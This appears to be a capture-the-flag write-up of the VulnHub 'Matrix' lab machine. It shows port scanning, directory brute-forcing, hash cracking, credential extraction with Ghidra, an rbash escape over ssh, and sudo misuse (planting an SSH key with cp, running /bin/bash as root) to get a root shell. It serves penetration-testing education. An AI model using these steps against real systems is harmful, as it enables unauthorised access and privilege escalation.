---
published: true
title: 'Matrix [VulHub]'
image: /assets/img/sample/matrix/logo.jpg
---
# [](#header-3) Nmap Scan

```shell
#nmap -p- -A 192.168.43.104
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-30 19:08 +0630
Nmap scan report for matrix (192.168.43.104)
Host is up (0.00045s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
|_http-title: Welcome in Matrix
6464/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:8b:c7:7b:48:db:db:0c:4b:68:69:80:7b:12:4e:49 (RSA)
|   256 49:6c:23:38:fb:79:cb:e0:b3:fe:b2:f4:32:a2:70:8e (ECDSA)
|_  256 53:27:6f:04:ed:d1:e7:81:fb:00:98:54:e6:00:84:4a (ED25519)
7331/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)
| http-auth: 
| HTTP/1.0 401 Unauthorized\x0D
|_  Basic realm=Login to Matrix
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:32:CF:84 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.45 ms matrix (192.168.43.104)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.26 second
```

# [](#header-3)Port 80

![Desktop View](/assets/img/sample/matrix/1.png)

# [](#header-3)Directory Scan 

```shell
┌─[root@cyb3rhoL1c]─[~/Desktop/vulhub/matrix_machine]
└──╼ #dirsearch -u 192.168.43.104 -w /opt/wordlists/directory-list-2.3-medium.txt -e *

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: data | HTTP method: get | Threads: 10 | Wordlist size: 220521

Error Log: /root/Downloads/dirsearch/logs/errors-20-07-30_20-37-09.log

Target: 192.168.43.104

[20:37:09] Starting: 
[20:37:09] 200 -    4KB - /     
[20:37:10] 301 -    0B  - /assets  ->  /assets/

```

Go into `/assets/img/` and you will see the photo of rabbit png file 

![Desktop View](/assets/img/sample/matrix/2.png)

PNG name is `Matrix_can-show-you-the-door` , so we can guess `Matrix` is a directory 

You can also see `dir scan`'s output like this

```shell
┌─[root@cyb3rhoL1c]─[~/Desktop/vulhub/matrix_machine]
└──╼ #dirsearch -u 192.168.43.104 -w /opt/wordlists/directory-list-2.3-medium.txt -e *

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: data | HTTP method: get | Threads: 10 | Wordlist size: 220521

Error Log: /root/Downloads/dirsearch/logs/errors-20-07-30_20-37-09.log

Target: 192.168.43.104

[20:37:09] Starting: 
[20:37:09] 200 -    4KB - /     
[20:37:10] 301 -    0B  - /assets  ->  /assets/
[20:41:15] 301 -    0B  - /Matrix  ->  /Matrix/
```

Visit this directory and you will see a lot of directories :(

![Desktop View](/assets/img/sample/matrix/3.png)

After some times I found this directories `/n/e/o/6/4` (neo is the name of the actor in the Matrix movie)

You can also use burpsuite for directory bruteforce 

![Desktop View](/assets/img/sample/matrix/burp.png)


Now download this secret file on your local machine 

```shell
┌─[root@cyb3rhoL1c]─[~/Desktop/vulhub/matrix_machine]
└──╼ #file secret.gz 
secret.gz: ASCII text
┌─[root@cyb3rhoL1c]─[~/Desktop/vulhub/matrix_machine]
└──╼ #cat secret.gz 
admin:76a2173be6393254e72ffa4d6df1030a
┌─[root@cyb3rhoL1c]─[~/Desktop/vulhub/matrix_machine]
└──╼ #
```

It's just ASCII text , not Zip file , so you can easily see with `cat` command

And decrypt it with `MD5` , Password is `passwd`

Now we have some credential but we have nothing to login 

From Nmap Output port 7331 httpserver is opened, let's dig in

Use Login with this credential `admin:passwd`

![Desktop View](/assets/img/sample/matrix/5.png)

Nothing Interesting , Let's scan directory again. This time I used `dirb`

```shell
┌─[root@cyb3rhoL1c]─[~/Desktop/vulhub/matrix_machine]
└──╼ #dirb http://192.168.43.104:7331/ -u admin:passwd

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Jul 30 20:57:28 2020
URL_BASE: http://192.168.43.104:7331/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
AUTHORIZATION: admin:passwd

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.43.104:7331/ ----
+ http://192.168.43.104:7331/assets (CODE:301|SIZE:0)                               
+ http://192.168.43.104:7331/data (CODE:301|SIZE:0)                                 
+ http://192.168.43.104:7331/index.html (CODE:200|SIZE:3889)                        
+ http://192.168.43.104:7331/robots.txt (CODE:200|SIZE:31)                          
                                                                                    
-----------------
END_TIME: Thu Jul 30 20:57:41 2020
DOWNLOADED: 4612 - FOUND: 4

```

I found a directory called `data` , visit and download this file

![Desktop View](/assets/img/sample/matrix/6.png)

![Desktop View](/assets/img/sample/matrix/7.png)

File type is DOS/Window Executable ,so we can reverse engineering this file with [Ghidra](https://ghidra-sre.org/)

Add this file to [Ghidra](https://ghidra-sre.org/) and after some time

I found a username and password `guest:7R1n17yN30`

![Desktop View](/assets/img/sample/matrix/4.png)

We already knew ssh is opening on port 6464. Let's login 

```shell
┌─[root@cyb3rhoL1c]─[~/Desktop/vulhub/matrix_machine]
└──╼ #ssh guest@192.168.43.104 -p6464
guest@192.168.43.104's password: 
Last login: Thu Jul 30 13:26:55 2020 from 192.168.43.126
guest@matrix:~$ id
-rbash: id: command not found
guest@matrix:~$ ^C
guest@matrix:~$ exit
logout
Connection to 192.168.43.104 closed.
```
Logined Successfully but it's rbash ,we can't run normal command

So use this command to login with bash `ssh guest@192.168.43.104 -p6464 -t "bash --noprofile"`

```shell
┌─[root@cyb3rhoL1c]─[~/Desktop/vulhub/matrix_machine]
└──╼ #ssh guest@192.168.43.104 -p6464 -t "bash --noprofile"
guest@192.168.43.104's password: 
guest@matrix:~$ sudo -l
User guest may run the following commands on matrix:
    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
    (trinity) NOPASSWD: /bin/cp
guest@matrix:~$ 
```

# [](#header-3)Privilege Escalaption

`trinity` user can run `/bin/cp` so let generate ssh key

```shell
guest@matrix:~$ ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/guest/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/guest/.ssh/id_rsa.
Your public key has been saved in /home/guest/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:lhle/Tkb5WlXikvNAwu6naeWHoRs+zuva4pOyi/fwI8 guest@matrix
The key's randomart image is:
+---[RSA 2048]----+
|                 |
|           .     |
|        . o o   o|
|       o B . B =o|
|        S . + Xoo|
|     . o = o ..=.|
|      + o +.o .  |
|   ..o * .=+     |
|    o=E +=B*.    |
+----[SHA256]-----+
guest@matrix:~$
```
Copy our `id_rsa.pub` to /home/trinity/.ssh/ and login it like me 

```shell
guest@matrix:~/.ssh$ ls
id_rsa  id_rsa.pub  known_hosts
guest@matrix:~/.ssh$ cp id_rsa.pub /home/guest
guest@matrix:~/.ssh$ cd
guest@matrix:~$ chmod 777 id_rsa.pub 
guest@matrix:~$ sudo -u trinity /bin/cp ./id_rsa.pub /home/trinity/.ssh/authorized_keys
guest@matrix:~$ ssh trinity@127.0.0.1 -i /.ssh/id_rsa -p 6464
Warning: Identity file /.ssh/id_rsa not accessible: No such file or directory.
Last login: Thu Jul 30 13:33:19 2020 from 127.0.0.1
trinity@matrix:~$ sudo -l
User trinity may run the following commands on matrix:
    (root) NOPASSWD: /home/trinity/oracle
trinity@matrix:~$ 
```
`oracle` can run as root but we have no oracle file `/home/trinity` directory

Let's create it :)

```shell
trinity@matrix:~$ echo "/bin/bash" > oracle
trinity@matrix:~$ chmod 777 oracle 
trinity@matrix:~$ sudo ./oracle 
root@matrix:/home/trinity# whoami
root
root@matrix:/home/trinity#

```

```shell
root@matrix:~# cat flag.txt 


             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |  Matrix is      |  |  |     |         |      |
     |  |  compromised    |  |  |/----|`---=    |      |
     |  |  C:\>_reload    |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"     -morpheus AKA (unknowndevice64)-
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
`-----------------------------'

-[ 7h!5 !5 n07 7h3 3nd, m47r!x w!11 r37urn ]-
root@matrix:~# 

```

Now we owned the machine [Enjoy :)]()
